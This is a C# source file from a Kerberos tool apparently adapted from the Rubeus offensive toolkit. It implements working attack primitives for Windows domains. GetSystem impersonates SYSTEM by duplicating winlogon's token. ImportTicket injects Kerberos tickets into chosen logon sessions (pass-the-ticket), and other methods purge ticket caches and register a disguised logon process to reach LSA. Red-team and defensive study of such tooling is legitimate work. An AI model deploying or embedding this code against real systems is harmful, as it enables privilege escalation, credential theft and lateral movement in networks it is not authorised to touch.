﻿//Taken from https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/LSA.cs by harmj0y

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ComponentModel;
using NLog;

namespace KerberosRun
{
    class LSA
    {
        internal static Logger logger = LogManager.GetCurrentClassLogger();
        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }


        public static bool GetSystem()
        {
            // helper to elevate to SYSTEM for Kerberos ticket enumeration via token impersonation
            if (IsHighIntegrity())
            {
                IntPtr hToken = IntPtr.Zero;

                // Open winlogon's token with TOKEN_DUPLICATE accesss so ca can make a copy of the token with DuplicateToken
                Process[] processes = Process.GetProcessesByName("winlogon");
                IntPtr handle = processes[0].Handle;

                // TOKEN_DUPLICATE = 0x0002
                bool success = Interop.OpenProcessToken(handle, 0x0002, out hToken);
                if (!success)
                {
                    //Console.WriteLine("OpenProcessToken failed!");
                    return false;
                }

                // make a copy of the NT AUTHORITY\SYSTEM token from winlogon
                // 2 == SecurityImpersonation
                IntPtr hDupToken = IntPtr.Zero;
                success = Interop.DuplicateToken(hToken, 2, ref hDupToken);
                if (!success)
                {
                    //Console.WriteLine("DuplicateToken failed!");
                    return false;
                }

                success = Interop.ImpersonateLoggedOnUser(hDupToken);
                if (!success)
                {
                    //Console.WriteLine("ImpersonateLoggedOnUser failed!");
                    return false;
                }

                // clean up the handles we created
                Interop.CloseHandle(hToken);
                Interop.CloseHandle(hDupToken);

                string name = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                if (name != "NT AUTHORITY\\SYSTEM")
                {
                    return false;
                }

                return true;
            }
            else
            {
                return false;
            }
        }


        public static void ImportTicket(byte[] ticket, LUID targetLuid)
        {
            // uses LsaCallAuthenticationPackage() with a message type of KERB_SUBMIT_TKT_REQUEST to submit a ticket
            //  for the current (or specified) logon session

            // straight from Vincent LE TOUX' work
            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971

            var LsaHandle = IntPtr.Zero;
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;

            if ((ulong)targetLuid != 0)
            {
                if (!IsHighIntegrity())
                {
                    logger.Error("[X] You need to be in high integrity to apply a ticket to a different logon session");
                    return;
                }
                else
                {
                    var currentName = WindowsIdentity.GetCurrent().Name;
                    if (currentName == "NT AUTHORITY\\SYSTEM")
                    {
                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                        LsaHandle = LsaRegisterLogonProcessHelper();
                    }
                    else
                    {
                        // elevated but not system, so gotta GetSystem() first
                        GetSystem();
                        // should now have the proper privileges to get a Handle to LSA
                        LsaHandle = LsaRegisterLogonProcessHelper();
                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                        Interop.RevertToSelf();
                    }
                }
            }
            else
            {
                // otherwise use the unprivileged connection with LsaConnectUntrusted
                ntstatus = Interop.LsaConnectUntrusted(out LsaHandle);
            }

            var inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                Interop.LSA_STRING_IN LSAString;
                var Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;
                ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    logger.Error("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                var request = new Interop.KERB_SUBMIT_TKT_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
                request.KerbCredSize = ticket.Length;
                request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));

                if ((ulong)targetLuid != 0)
                {
                    logger.Info("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
                    request.LogonId = targetLuid;
                }

                var inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    logger.Error("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                if (ProtocalStatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    logger.Error("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winError, errorMessage);
                    return;
                }
                logger.Info("[+] Ticket successfully imported!");
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);
                Interop.LsaDeregisterLogonProcess(LsaHandle);
            }
        }

        public static void Purge(LUID targetLuid)
        {
            // uses LsaCallAuthenticationPackage() with a message type of KERB_PURGE_TKT_CACHE_REQUEST to purge tickets
            //  for the current (or specified) logon session

            // straight from Vincent LE TOUX' work
            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971

            var lsaHandle = GetLsaHandle();
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;

            if ((ulong)targetLuid != 0)
            {
                if (!IsHighIntegrity())
                {
                    logger.Error("[X] You need to be in high integrity to purge tickets from a different logon session");
                    return;
                }

            }

            var inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                Interop.LSA_STRING_IN LSAString;
                var Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;
                ntstatus = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    logger.Error("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }

                var request = new Interop.KERB_PURGE_TKT_CACHE_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage;

                if ((ulong)targetLuid != 0)
                {
                    logger.Info("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
                    request.LogonId = targetLuid;
                }

                var inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_PURGE_TKT_CACHE_REQUEST));
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                ntstatus = Interop.LsaCallAuthenticationPackage(lsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    logger.Error("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                if (ProtocalStatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    logger.Error("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocolStatus): {1}", winError, errorMessage);
                    return;
                }
                logger.Info("[+] Tickets successfully purged!");
            }
            finally
            {
                if (inputBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(inputBuffer);
                Interop.LsaDeregisterLogonProcess(lsaHandle);
            }
        }



        public static IntPtr GetLsaHandle()
        {
            // returns a handle to LSA
            //  uses LsaConnectUntrusted() if not in high integrity
            //  uses LsaRegisterLogonProcessHelper() if in high integrity

            IntPtr lsaHandle;

            if (!IsHighIntegrity())
            {
                int retCode = Interop.LsaConnectUntrusted(out lsaHandle);
            }

            else
            {
                lsaHandle = LsaRegisterLogonProcessHelper();

                // if the original call fails then it is likely we don't have SeTcbPrivilege
                // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
                if (lsaHandle == IntPtr.Zero)
                {
                    var currentName = WindowsIdentity.GetCurrent().Name;

                    if (currentName == "NT AUTHORITY\\SYSTEM")
                    {
                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                        lsaHandle = LsaRegisterLogonProcessHelper();
                    }
                    else
                    {
                        // elevated but not system, so gotta GetSystem() first
                        if (!GetSystem())
                        {
                            throw new Exception("Could not elevate to system");
                        }
                        // should now have the proper privileges to get a Handle to LSA
                        lsaHandle = LsaRegisterLogonProcessHelper();
                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                        Interop.RevertToSelf();
                    }
                }
            }

            return lsaHandle;
        }


        public static IntPtr LsaRegisterLogonProcessHelper()
        {
            // helper that establishes a connection to the LSA server and verifies that the caller is a logon application
            //  used for Kerberos ticket enumeration for ALL users

            var logonProcessName = "User32LogonProcesss"; // yes I know this is "weird" ;)
            Interop.LSA_STRING_IN LSAString;
            var lsaHandle = IntPtr.Zero;
            UInt64 securityMode = 0;

            LSAString.Length = (ushort)logonProcessName.Length;
            LSAString.MaximumLength = (ushort)(logonProcessName.Length + 1);
            LSAString.Buffer = logonProcessName;

            var ret = Interop.LsaRegisterLogonProcess(LSAString, out lsaHandle, out securityMode);

            return lsaHandle;
        }
    }
}
